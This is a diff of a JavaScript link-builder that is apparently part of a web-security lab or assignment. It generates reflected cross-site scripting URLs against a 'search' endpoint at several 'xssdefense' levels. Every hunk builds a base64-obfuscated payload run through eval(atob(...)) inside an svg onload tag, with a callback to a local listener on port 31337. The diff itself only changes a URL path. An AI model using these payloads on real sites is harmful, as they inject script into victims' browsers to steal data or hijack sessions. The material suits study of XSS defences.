@@ -81,7 +81,7 @@ function makeLink(target, attacker, defense) {
             var to_run = payload_string+";payload('http://127.0.0.1:31337');";
             var encoded = btoa(to_run);
             var real_payload = "eval(atob(\""+encoded+"\"))";
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			return target + "search?xssdefense=" + (defense-2) + "&q=" +
 				encodeURIComponent(
                                             "<svg/onload=("+real_payload+")>"
                                         );
@@ -98,7 +98,7 @@ function makeLink(target, attacker, defense) {
             var to_run = payload_string+";payload('http://127.0.0.1:31337');";
             var encoded = btoa(to_run);
             var real_payload = "eval(atob(\""+encoded+"\"))";
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			return target + "search?xssdefense=" + (defense-2) + "&q=" +
 				encodeURIComponent(
                                             "<svg/onload=("+real_payload+")>"
                                         );
@@ -115,7 +115,7 @@ function makeLink(target, attacker, defense) {
             var to_run = payload_string+";payload('http://127.0.0.1:31337');";
             var encoded = btoa(to_run);
             var real_payload = "eval(atob(\""+encoded+"\"))";
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			return target + "search?xssdefense=" + (defense-2) + "&q=" +
 				encodeURIComponent(
                                             "<svg/onload=("+real_payload+")>"
                                         );
@@ -132,7 +132,7 @@ function makeLink(target, attacker, defense) {
             var to_run = payload_string+";payload('http://127.0.0.1:31337');";
             var encoded = btoa(to_run);
             var real_payload = "eval(atob(\""+encoded+"\"))";
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			return target + "search?xssdefense=" + (defense-2) + "&q=" +
 				encodeURIComponent(
                                             "<svg/onload=("+real_payload+")>"
                                         );
@@ -148,7 +148,7 @@ function makeLink(target, attacker, defense) {
                                     }
                         charcode+=")";
             var real_payload = "eval(atob(\""+charcode+"\"))";
-			return target + "/search?xssdefense=" + (defense-2) + "&q=" +
+			return target + "search?xssdefense=" + (defense-2) + "&q=" +
 				encodeURIComponent(
                                             "<svg/onload=("+real_payload+")>"
                                         );
